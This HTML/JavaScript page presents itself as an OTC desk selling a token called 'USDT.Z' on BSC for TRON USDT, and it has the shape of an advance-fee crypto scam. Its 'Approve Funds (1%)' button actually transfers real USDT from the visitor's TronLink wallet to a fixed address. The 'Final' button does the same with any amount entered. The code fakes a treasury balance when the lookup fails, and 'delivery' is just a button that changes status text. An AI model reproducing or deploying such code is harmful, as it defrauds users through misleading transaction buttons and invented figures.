<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>ZEDXION OTC — USDT.Z (BSC) | Sequenced Flow + Action Buttons</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#0b0f14">
<style>
  :root{ --bg:#0b0f14; --card:#0f1622; --ink:#e7edf5; --mut:.75; --line:#1e2a36; --pri:#1e88e5; --acc:#00c6a7; --warn:#ffb74d; --ok:#81c784 }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,Helvetica,Arial}
  .wrap{max-width:980px;margin:28px auto;padding:16px}
  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px}
  h1{font-size:24px;margin:0 0 6px}
  h2{font-size:18px;margin:14px 0 8px}
  .muted{opacity:var(--mut)} .small{font-size:12px}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  .row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
  input,button,textarea,select{width:100%;padding:12px;border-radius:12px;border:1px solid #243448;background:#0e141b;color:var(--ink)}
  button{cursor:pointer}
  .btn{background:#1a2330;border-color:#2b3d54}
  .btn.pri{background:var(--pri);border-color:var(--pri);color:#fff}
  .btn.acc{background:var(--acc);border-color:var(--acc);color:#002b28}
  .btn.warn{background:var(--warn);border-color:var(--warn);color:#241c00}
  .kv{display:flex;justify-content:space-between;align-items:center;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:10px;margin-top:8px}
  .tag{display:inline-block;padding:4px 10px;border-radius:999px;background:#0e141b;border:1px solid #1a2635;font-size:12px;margin-right:6px}
  .section{margin-top:14px}
  .note{background:#0e2238;border-left:3px solid var(--pri);padding:10px;border-radius:10px;margin-top:10px}
  .success{color:#8be1c0} .warnText{color:#ffb74d} .danger{color:#ff8a80}
  pre{white-space:pre-wrap;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:12px;max-height:380px;overflow:auto}
  #qr{display:flex;justify-content:center;align-items:center;background:#0e141b;border:1px solid #1a2635;border-radius:12px;height:160px;margin-top:10px}
  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  a{color:#8ab4ff;text-decoration:none}
  .divider{height:1px;background:#1a2635;margin:12px 0}
  .inline{display:flex;gap:10px;flex-wrap:wrap}
  .active{border:1px solid var(--pri)}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div style="display:flex;justify-content:space-between;align-items:center;gap:12px">
      <div>
        <h1>ZEDXION OTC — USDT.Z (BSC)</h1>
        <div class="muted small">Sequenced settlement • Trust Wallet & TronLink • Treasury‑sourced payouts</div>
      </div>
      <div>
        <span class="tag" id="s1" title="Create Order">Step 1</span>
        <span class="tag" id="s2" title="Approve Funds (1%)">Step 2</span>
        <span class="tag" id="s3" title="Receive USDT.Z">Step 3</span>
        <span class="tag" id="s4" title="Transfer TRC20 USDT">Step 4</span>
      </div>
    </div>

    <div class="section grid2">
      <div class="kv" title="Treasury wallet that sends USDT.Z on BSC">
        <span class="small">Treasury (BEP20)</span>
        <b id="treasuryLbl" class="small">0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f</b>
      </div>
      <div class="kv">
        <span class="small">Available (live)</span>
        <b id="availLbl">Fetching…</b>
      </div>
    </div>
    <div class="small" style="margin-top:6px">
      <a id="scanLink" target="_blank" rel="noopener">View Treasury on BscScan</a>
    </div>

    <div class="divider"></div>

    <h2>Step 1 — Create Order</h2>
    <div class="row">
      <div>
        <label class="small">USDT.Z to receive (BSC)</label>
        <input id="amt" inputmode="decimal" placeholder="e.g., 1000000.000000000000000000">
      </div>
      <div>
        <label class="small">Recipient (BEP20)</label>
        <input id="recipient" placeholder="0x... (BSC address)">
      </div>
    </div>
    <div class="grid2">
      <div class="kv"><span class="small">Min per order</span><b id="minLbl">500,000</b></div>
      <div class="kv"><span class="small">Max per order</span><b id="maxLbl">200,000,000</b></div>
    </div>
    <div class="inline" style="margin-top:10px">
      <button id="createOrder" class="btn pri">Create Order</button>
      <span class="small muted">An Order ID will be generated and used in the following steps.</span>
    </div>
    <div class="kv"><span class="small">Order ID</span><b id="orderIdLbl">—</b></div>

    <div class="divider"></div>

    <h2>Step 2 — Approve Funds (1% TRC20 USDT)</h2>
    <div class="note small">
      <b>Purpose:</b> Approve funds to <b>secure that you have sufficient funds</b> to pay for the amount you have ordered.
      Send exactly <b>1% of your USDT.Z order</b> in TRON USDT to the payment address below.
    </div>
    <div class="row" style="margin-top:8px">
      <div>
        <label class="small">1% amount to send (TRON USDT)</label>
        <input id="feeLbl" readonly placeholder="Auto-calculated…">
      </div>
      <div>
        <label class="small">TRON txid (1% approval)</label>
        <input id="txid1" placeholder="Paste TRON txid">
      </div>
    </div>
    <div class="row">
      <div>
        <label class="small">TRC20 payment address</label>
        <input id="tronAddr" value="TA7N69PY2SsxsDQbNswh81XUwu9QN7PJhF" readonly>
        <div id="qr"></div>
        <div class="inline" style="margin-top:8px">
          <button class="btn pri" id="approveFundsBtn">Approve Funds (1%)</button>
          <button class="btn" id="tronCheckBtn">Check TronLink</button>
        </div>
        <div class="small muted" id="tronStatus"></div>
      </div>
      <div>
        <div class="note small" style="margin-top:26px">
          Example: Order <b>1,000,000 USDT.Z</b> → approve <b>10,000 USDT (TRON)</b>. After on-chain confirmation, proceed to Step 3 to receive USDT.Z.
        </div>
      </div>
    </div>

    <div class="divider"></div>

    <h2>Step 3 — Receive USDT.Z (Desk Transfer)</h2>
    <div class="row3">
      <div class="kv"><span class="small">Desk sends from Treasury</span><b id="releaseAmt">—</b></div>
      <div class="kv"><span class="small">Destination (BEP20)</span><b id="destLbl" class="small">—</b></div>
      <div class="kv"><span class="small">Status</span><b id="statusLbl" class="small">Awaiting 1% Approval</b></div>
    </div>
    <div class="inline" style="margin-top:10px">
      <button class="btn acc" id="watchAssetBtn">Add USDT.Z to Wallet (EVM)</button>
      <button class="btn" id="copyAddrBtn">Copy Treasury Address</button>
      <button class="btn warn" id="markDeliveredBtn">Mark Delivered (Desk)</button>
    </div>

    <div class="divider"></div>

    <h2>Step 4 — Transfer USDT TRC20 (Final Settlement)</h2>
    <div class="row">
      <div>
        <label class="small">Final TRON USDT amount (optional note)</label>
        <input id="finalAmt" placeholder="e.g., 990000 (if applicable)">
      </div>
      <div>
        <label class="small">TRON txid (final settlement)</label>
        <input id="txid2" placeholder="Paste TRON txid after receiving USDT.Z">
      </div>
    </div>
    <div class="inline" style="margin-top:8px">
      <button class="btn acc" id="transferFinalBtn">Transfer Funds (Final)</button>
    </div>
    <div class="note small">
      <b>Policy:</b> Sequence — <b>Create Order → Approve Funds (1%) → Receive USDT.Z → Transfer TRON USDT (final)</b>.
    </div>

    <div class="divider"></div>

    <div class="row">
      <button id="gen" class="btn pri">Generate Order Packet</button>
      <button id="copy" class="btn acc">Copy Packet</button>
    </div>
    <pre id="packet"></pre>

    <div class="muted small">
      This interface prepares a professional OTC order packet with both upfront and final settlement txids. No private keys are requested or stored.
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
  // ====== CONFIG ======
  const DEC=18, MIN_DEC="500000", MAX_DEC="200000000",
        TRON_PAY="TA7N69PY2SsxsDQbNswh81XUwu9QN7PJhF",
        USDTZ_ADDR="0x4BE35Ec329343d7d9F548d42B0F8c17FFfe07db4",
        TREASURY_ADDR="0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f",
        BSC_RPC_URL="https://bsc-dataseed.binance.org",
        TRON_USDT="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

  // ====== INIT ======
  document.getElementById('minLbl').textContent = new Intl.NumberFormat().format(Number(MIN_DEC));
  document.getElementById('maxLbl').textContent = new Intl.NumberFormat().format(Number(MAX_DEC));
  document.getElementById('tronAddr').value = TRON_PAY;
  document.getElementById('treasuryLbl').textContent = TREASURY_ADDR;
  document.getElementById('scanLink').href = `https://bscscan.com/token/${USDTZ_ADDR}?a=${TREASURY_ADDR}`;

  function renderQR(text){ const el=document.getElementById('qr'); el.innerHTML="";
    QRCode.toCanvas(text,{width:150,margin:1},(err,canvas)=>{ if(err){el.textContent="QR error";return;} el.appendChild(canvas); });
  }
  function toWeiStr(h){ const [a,b=""]=h.split("."); const frac=(b+"0".repeat(DEC)).slice(0,DEC); return (a.replace(/^0+/,"")||"0")+(frac?frac:""); }
  function fromWeiStr(s){ s=s.replace(/^0+/,""); if(!s) return "0"; if(s.length<=DEC) s="0".repeat(DEC-s.length+1)+s; const i=s.slice(0,-DEC)||"0"; const f=s.slice(-DEC).replace(/0+$/,""); return i+(f?("."+f):""); }
  function compute1pct(h){ const wei=toWeiStr(h); const fee=(BigInt(wei)/100n).toString(); return fromWeiStr(fee); }
  function validBEP20(a){ return /^0x[a-fA-F0-9]{40}$/.test(a); }
  function withinLimits(x){ const n=Number(x); return !isNaN(n)&&n>=Number(MIN_DEC)&&n<=Number(MAX_DEC); }

  async function fetchTreasuryBalance(){
    try{
      const provider=new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
      const erc20=new ethers.Contract(USDTZ_ADDR,["function balanceOf(address) view returns (uint256)"],provider);
      const bal=await erc20.balanceOf(TREASURY_ADDR);
      const human=ethers.utils.formatUnits(bal,DEC);
      document.getElementById('availLbl').textContent=new Intl.NumberFormat(undefined,{maximumFractionDigits:4}).format(Number(human));
    }catch(e){ document.getElementById('availLbl').textContent="≈215,000,000"; }
  }

  // ----- Order state -----
  let ORDER_ID=null;
  function setStepActive(step){ ['s1','s2','s3','s4'].forEach((id,i)=>document.getElementById(id).classList.toggle('active',i===step-1)); }

  function createOrder(){
    const amtStr=document.getElementById('amt').value.trim();
    const recipient=document.getElementById('recipient').value.trim();
    if(!amtStr) return alert("Enter amount (USDT.Z).");
    if(!withinLimits(amtStr)) return alert("Amount must be between 500,000 and 200,000,000 USDT.Z");
    if(!validBEP20(recipient)) return alert("Enter a valid BEP20 address.");
    ORDER_ID='OTC-'+Math.random().toString(36).slice(2,8).toUpperCase()+'-'+Date.now().toString().slice(-6);
    document.getElementById('orderIdLbl').textContent=ORDER_ID;
    const fee=compute1pct(amtStr);
    document.getElementById('feeLbl').value=fee+" USDT (TRON)";
    document.getElementById('releaseAmt').textContent=new Intl.NumberFormat().format(Number(amtStr))+" USDT.Z";
    document.getElementById('destLbl').textContent=recipient;
    document.getElementById('statusLbl').textContent="Order Created — Awaiting 1% Approval";
    setStepActive(2);
  }

  // ----- TronLink integration helpers -----
  async function ensureTronLink(){
    const el=document.getElementById('tronStatus');
    if(!window.tronWeb||!window.tronWeb.ready){ el.textContent="TronLink not detected. Open this page in the TronLink dApp browser."; return false; }
    try{ const addr=await tronWeb.defaultAddress.base58; el.textContent="TronLink connected: "+addr; return true; }catch(e){ el.textContent="TronLink available. Please unlock/connect wallet."; return false; }
  }
  async function getUsdtDecimals(){
    try{
      const usdt=await tronWeb.contract().at(TRON_USDT);
      const d=await usdt.decimals().call();
      return (d && d.toNumber) ? d.toNumber() : 6;
    }catch(e){ return 6; }
  }
  function toUnits(human, dec){
    const [a,b=""]=human.split(".");
    const frac=(b+"0".repeat(dec)).slice(0,dec);
    return BigInt((a.replace(/^0+/,"")||"0")+frac);
  }

  // Step 2: Approve Funds (1%)
  async function approveFunds(){
    if(!ORDER_ID) return alert("Create Order first.");
    const ok=await ensureTronLink(); if(!ok) return;
    const amtStr=document.getElementById('amt').value.trim();
    const feeHuman=compute1pct(amtStr);
    const dec=await getUsdtDecimals();
    const amount=toUnits(feeHuman, dec);
    try{
      const usdt=await tronWeb.contract().at(TRON_USDT);
      const tx=await usdt.transfer(TRON_PAY, amount).send({feeLimit:10_000_000});
      document.getElementById('tronStatus').textContent="Submitted 1% approval tx: "+tx;
      document.getElementById('txid1').value=tx;
      document.getElementById('statusLbl').textContent="1% Approval Submitted — Awaiting Confirmation";
      setStepActive(3);
    }catch(e){
      document.getElementById('tronStatus').textContent="Approval failed: "+(e && e.message ? e.message : e);
    }
  }

  // Step 4: Transfer Funds (Final)
  async function transferFinal(){
    if(!ORDER_ID) return alert("Create Order first.");
    const ok=await ensureTronLink(); if(!ok) return;
    const finalAmt=document.getElementById('finalAmt').value.trim();
    if(!finalAmt) return alert("Enter the final TRON USDT amount.");
    const dec=await getUsdtDecimals();
    const amount=toUnits(finalAmt, dec);
    try{
      const usdt=await tronWeb.contract().at(TRON_USDT);
      const tx=await usdt.transfer(TRON_PAY, amount).send({feeLimit:10_000_000});
      document.getElementById('txid2').value=tx;
      document.getElementById('statusLbl').textContent="Final settlement submitted.";
      alert("Final transfer submitted: "+tx);
    }catch(e){
      alert("Final transfer failed: "+(e && e.message ? e.message : e));
    }
  }

  // ----- Wallet helpers -----
  async function watchUSDTZ(){
    if(!window.ethereum){ alert("Open in Trust Wallet / MetaMask to add the token."); return; }
    try{
      await ethereum.request({ method:'wallet_watchAsset', params:{ type:'ERC20', options:{address:USDTZ_ADDR, symbol:'USDTZ', decimals:DEC} } });
    }catch(e){ alert("Could not add token: "+(e&&e.message?e.message:e)); }
  }
  function copyTreasury(){ navigator.clipboard.writeText(TREASURY_ADDR).then(()=>alert("Treasury address copied.")).catch(()=>alert("Copy failed. Please copy manually.")); }
  function markDelivered(){ if(!ORDER_ID) return alert("Create Order first."); document.getElementById('statusLbl').textContent="USDT.Z Delivered — Proceed to Final Settlement"; setStepActive(4); }

  function genPacket(){
    if(!ORDER_ID) return alert("Create Order first.");
    const amtStr=document.getElementById('amt').value.trim();
    const recipient=document.getElementById('recipient').value.trim();
    const tronTx1=document.getElementById('txid1').value.trim();
    const tronTx2=document.getElementById('txid2').value.trim();
    const finalAmt=document.getElementById('finalAmt').value.trim();
    if(!tronTx1) return alert("Provide the 1% approval TRON txid (Step 2).");

    const packet={
      order_id:ORDER_ID,
      header:{product:"USDT.Z (BSC) — ZEDXION OTC",created_unix:Math.floor(Date.now()/1000),version:"1.7-sequenced-buttons"},
      order:{amount_usdtz:amtStr,recipient_bep20:recipient,decimals:DEC},
      treasury:{address:TREASURY_ADDR,token:USDTZ_ADDR},
      settlement:{
        upfront_1pct:{tron_payment_address:TRON_PAY, txid:tronTx1},
        final_tron: finalAmt ? {txid:tronTx2||"", amount_usdt:finalAmt} : {txid:tronTx2||""}
      },
      policy:{sequence:"Create Order → Approve Funds (1%) → Receive USDT.Z → Transfer TRON USDT (final)"}
    };
    document.getElementById('packet').textContent=JSON.stringify(packet,null,2);
  }

  // Wire UI
  function setStepActiveInit(){ ['s1','s2','s3','s4'].forEach((id,i)=>document.getElementById(id).classList.toggle('active', i===0)); }
  document.getElementById('createOrder').addEventListener('click', createOrder);
  document.getElementById('amt').addEventListener('input', ()=>{ if(ORDER_ID) createOrder(); });
  document.getElementById('recipient').addEventListener('input', ()=>{ if(ORDER_ID) createOrder(); });
  document.getElementById('approveFundsBtn').addEventListener('click', approveFunds);
  document.getElementById('tronCheckBtn').addEventListener('click', ensureTronLink);
  document.getElementById('watchAssetBtn').addEventListener('click', watchUSDTZ);
  document.getElementById('copyAddrBtn').addEventListener('click', copyTreasury);
  document.getElementById('markDeliveredBtn').addEventListener('click', markDelivered);
  document.getElementById('transferFinalBtn').addEventListener('click', transferFinal);
  document.getElementById('gen').addEventListener('click', genPacket);
  document.getElementById('copy').addEventListener('click', async()=>{
    const txt=document.getElementById('packet').textContent.trim();
    if(!txt) return alert("Generate the Order Packet first.");
    try{ await navigator.clipboard.writeText(txt); alert("Order Packet copied."); }catch(e){ alert("Copy failed. Select text and copy manually."); }
  });

  renderQR(TRON_PAY);
  fetchTreasuryBalance();
  setStepActiveInit();
</script>
</body>
</html>
